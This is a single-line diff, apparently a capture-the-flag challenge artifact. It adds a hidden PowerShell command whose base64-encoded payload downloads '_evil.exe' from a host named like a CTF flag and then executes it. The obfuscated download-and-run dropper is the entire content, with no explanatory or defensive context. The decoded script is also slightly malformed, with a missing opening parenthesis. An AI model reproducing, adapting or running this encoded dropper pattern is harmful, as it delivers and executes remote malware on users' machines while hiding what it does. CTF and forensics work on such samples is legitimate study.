@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowershell\v3.1\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTklDQ1RGMjZ7NGI4ZjRiMGIwZTRlNGY0ZTRiOGY0YjBiMGU0ZTRmNGV9L19ldmlsLmV4ZScsJ2V2aWwuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZXZpbC5leGUn
